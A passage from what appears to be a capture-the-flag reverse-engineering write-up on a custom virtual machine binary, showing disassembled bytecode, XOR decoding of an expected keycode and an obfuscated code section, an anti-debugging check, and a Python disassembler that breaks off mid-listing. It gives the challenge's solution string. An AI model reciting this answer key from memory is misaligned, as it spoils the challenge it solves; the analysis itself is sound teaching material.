</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x2a: MOV 0x1e = 0xfa0
</span></span><span class=line><span class=cl>0x2b: MOV 0x1c = 0x0
</span></span><span class=line><span class=cl>0x2c: MOV 0x1d = 0x11
</span></span><span class=line><span class=cl>0x2d: INPUT: 0x19
</span></span><span class=line><span class=cl>0x2e: STORE 0x19 -&gt; 0x1e
</span></span><span class=line><span class=cl>0x2f: ADD 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0x30: ADD 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0x31: JLE 0x2d IF 0x1c &gt; 0x1d
</span></span><span class=line><span class=cl>0x32: MOV 0x1e = 0x1004
</span></span><span class=line><span class=cl>0x33: MOV 0x1f = 0xfa0
</span></span><span class=line><span class=cl>0x34: MOV 0x1c = 0x0
</span></span><span class=line><span class=cl>0x35: MOV 0x1d = 0xa
</span></span><span class=line><span class=cl>0x36: MOV 0x1b = 0xa9
</span></span><span class=line><span class=cl>0x37: MOV 0x17 = 0x0
</span></span><span class=line><span class=cl>0x38: LOAD 0x19 &lt;- 0x1e
</span></span><span class=line><span class=cl>0x39: LOAD 0x18 &lt;- 0x1f
</span></span><span class=line><span class=cl>0x3a: XOR 0x19 = 0x19 ^ 0x1b
</span></span><span class=line><span class=cl>0x3b: JE 0x4e IF 0x19 == 0x18
</span></span><span class=line><span class=cl>0x3c: putc(&#39;U&#39;)
</span></span><span class=line><span class=cl>0x3d: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x3e: putc(&#39;k&#39;)
</span></span><span class=line><span class=cl>0x3f: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x40: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0x41: putc(&#39;w&#39;)
</span></span><span class=line><span class=cl>0x42: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x43: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x44: putc(&#39;k&#39;)
</span></span><span class=line><span class=cl>0x45: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x46: putc(&#39;y&#39;)
</span></span><span class=line><span class=cl>0x47: putc(&#39;c&#39;)
</span></span><span class=line><span class=cl>0x48: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0x49: putc(&#39;d&#39;)
</span></span><span class=line><span class=cl>0x4a: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x4b: putc(&#39;!&#39;)
</span></span><span class=line><span class=cl>0x4c: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span><span class=line><span class=cl>0x4d: VM EXIT
</span></span><span class=line><span class=cl>0x4e: ADD 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0x4f: ADD 0x1f = 0x1f + 0x1
</span></span><span class=line><span class=cl>0x50: ADD 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0x51: JLE 0x38 IF 0x1c &gt; 0x1d
</span></span></code></pre></td></tr></table></div></div><p>From the disassembly, we can see the user input is at <code>0xfa0</code> (4000), the
encoded string is at 0x1004 (4100), and the encoded string is <code>xor</code>&rsquo;d
with the constant value <code>0xa9</code> (169).</p><p>So we can manually pull that data out and do the xor, since xor is reversible we will
get a string that, when inputted, will pass the character checks.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>In</span> <span class=p>[</span><span class=mi>1</span><span class=p>]:</span> <span class=n>code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>   <span class=o>...</span><span class=p>:</span> <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;bin&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>   <span class=o>...</span><span class=p>:</span>     <span class=n>encoded_string</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()[</span><span class=mh>0x1004</span> <span class=o>+</span> <span class=mi>3</span><span class=p>:</span><span class=mh>0x1004</span><span class=o>+</span> <span class=mi>3</span> <span class=o>+</span> <span class=mi>11</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=o>...</span><span class=p>:</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>encoded_string</span><span class=p>:</span>
</span></span><span class=line><span class=cl>   <span class=o>...</span><span class=p>:</span>     <span class=n>code</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>char</span> <span class=o>^</span> <span class=mh>0xa9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=o>...</span><span class=p>:</span> <span class=n>code</span>
</span></span><span class=line><span class=cl><span class=n>Out</span><span class=p>[</span><span class=mi>1</span><span class=p>]:</span> <span class=s1>&#39;c0d3_r3d_5h&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>I think this was actually meant to be a comparison of the full 17 expected
bytes, which would have given the string <code>c0d3_r3d_5hutd0wn</code>, but <code>c0d3_r3d_5h</code>
actually works fine, by just appending random characters to the end.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/alien/ss4.png data-srcset="./images/alien/ss4.png, ./images/alien/ss4.png 1.5x, ./images/alien/ss4.png 2x" data-sizes=auto alt=./images/alien/ss4.png title="cleaned up vm_step function"></p><p>The next chunk of assembly basically does a sort of &ldquo;am I being debugged&rdquo; check. The program exits
if it detects this.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x4e: ADD 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0x4f: ADD 0x1f = 0x1f + 0x1
</span></span><span class=line><span class=cl>0x50: ADD 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0x51: JLE 0x38 IF 0x1c &gt; 0x1d
</span></span><span class=line><span class=cl>0x52: MOV 0xf = 0x0
</span></span><span class=line><span class=cl>0x53: PUSH 0xf
</span></span><span class=line><span class=cl>0x54: PUSH 0xf
</span></span><span class=line><span class=cl>0x55: PUSH 0xf
</span></span><span class=line><span class=cl>0x56: INV 0x65, 0x3
</span></span><span class=line><span class=cl>0x57: MOV 0x10 = 0x0
</span></span><span class=line><span class=cl>0x58: JE 0x6c IF 0x1f == 0x10
</span></span><span class=line><span class=cl>0x59: putc(&#39;T&#39;)
</span></span><span class=line><span class=cl>0x5a: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x5b: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0x5c: putc(&#39;m&#39;)
</span></span><span class=line><span class=cl>0x5d: putc(&#39;i&#39;)
</span></span><span class=line><span class=cl>0x5e: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x5f: putc(&#39;a&#39;)
</span></span><span class=line><span class=cl>0x60: putc(&#39;l&#39;)
</span></span><span class=line><span class=cl>0x61: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x62: putc(&#39;b&#39;)
</span></span><span class=line><span class=cl>0x63: putc(&#39;l&#39;)
</span></span><span class=line><span class=cl>0x64: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0x65: putc(&#39;c&#39;)
</span></span><span class=line><span class=cl>0x66: putc(&#39;k&#39;)
</span></span><span class=line><span class=cl>0x67: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x68: putc(&#39;d&#39;)
</span></span><span class=line><span class=cl>0x69: putc(&#39;!&#39;)
</span></span><span class=line><span class=cl>0x6a: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span></code></pre></td></tr></table></div></div><p>This can be overcome simply by patching out the syscall
instruction - though we don&rsquo;t need to do that as we&rsquo;re solving the challenge entirely statically.</p><h3 id=unravelling-more-code>Unravelling more Code</h3><p>The program now prompts for a &lsquo;secret phrase&rsquo;. Strange thing here is that there is only slightly more code remaining
from our assembly dump, and it doesn&rsquo;t include printing the prompt&mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x6c: MOV 0x1e = 0x77
</span></span><span class=line><span class=cl>0x6d: MULTI 0x1e = 0x1e * 0x6
</span></span><span class=line><span class=cl>0x6e: MOV 0x1c = 0x0
</span></span><span class=line><span class=cl>0x6f: MOV 0x1d = 0x5dc
</span></span><span class=line><span class=cl>0x70: MOV 0x1b = 0x45
</span></span><span class=line><span class=cl>0x71: LOAD 0x19 &lt;- 0x1e
</span></span><span class=line><span class=cl>0x72: XOR 0x19 = 0x19 ^ 0x1b
</span></span><span class=line><span class=cl>0x73: STORE 0x19 -&gt; 0x1e
</span></span><span class=line><span class=cl>0x74: ADD 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0x75: ADD 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0x76: JLE 0x71 IF 0x1c &gt; 0x1d
</span></span></code></pre></td></tr></table></div></div><p>This is because parts of the program have been scrambled as well, using <code>xor</code>. So, starting from 0x77 (the next instruction after
the <code>JLE</code>), the program will <code>xor</code> 1500 bytes of data with the constant value <code>0x45</code>. We can reverse this operation too.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>In</span> <span class=p>[</span><span class=mi>10</span><span class=p>]:</span> <span class=n>code</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;UwU&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span><span class=p>:</span> <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;bin&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span><span class=p>:</span>     <span class=n>encoded_string</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()[</span><span class=mh>0x77</span> <span class=o>+</span> <span class=mi>3</span><span class=p>:</span><span class=mh>0x77</span><span class=o>+</span> <span class=mi>3</span> <span class=o>+</span> <span class=mi>1500</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span><span class=p>:</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>encoded_string</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span><span class=p>:</span>     <span class=n>code</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>char</span> <span class=o>^</span> <span class=mh>0x45</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span><span class=p>:</span> <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;part2_bin&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span><span class=p>:</span>     <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Also needed to update the disassembling script here, to handle some additional operations
and also add functionality for the user to specify a file to disassemble.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>file_data</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>instruction_counter</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_putc</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: putc(&#39;</span><span class=si>{</span><span class=nb>chr</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=si>}</span><span class=s2>&#39;)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_mov</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>imm</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: MOV </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>imm</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_input</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>:</span><span class=mi>3</span><span class=p>]</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: INPUT: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_store</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: STORE </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>src</span><span class=p>)</span><span class=si>}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_add</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>a2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>a3</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: ADD </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>a1</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>a2</span><span class=p>)</span><span class=si>}</span><span class=s2> + </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>a3</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_jle</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>cmp1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>cmp2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>jmp_addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>:</span><span class=mi>5</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: JLE </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>jmp_addr</span><span class=p>)</span><span class=si>}</span><span class=s2> IF </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>cmp1</span><span class=p>)</span><span class=si>}</span><span class=s2> &gt; </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>cmp2</span><span class=p>)</span><span class=si>}</span><span class=s2>  &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_load</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: LOAD </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>src</span><span class=p>)</span><span class=si>}</span><span class=s2> &lt;- </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_xor</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>xor1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>xor2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: XOR </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>xor1</span><span class=p>)</span><span class=si>}</span><span class=s2> ^ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>xor2</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_je</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>cmp1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>cmp2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>jmp_addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>:</span><span class=mi>5</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: JE </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>jmp_addr</span><span class=p>)</span><span class=si>}</span><span class=s2> IF </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>cmp1</span><span class=p>)</span><span class=si>}</span><span class=s2> == </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>cmp2</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_exit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: VM EXIT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_push</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
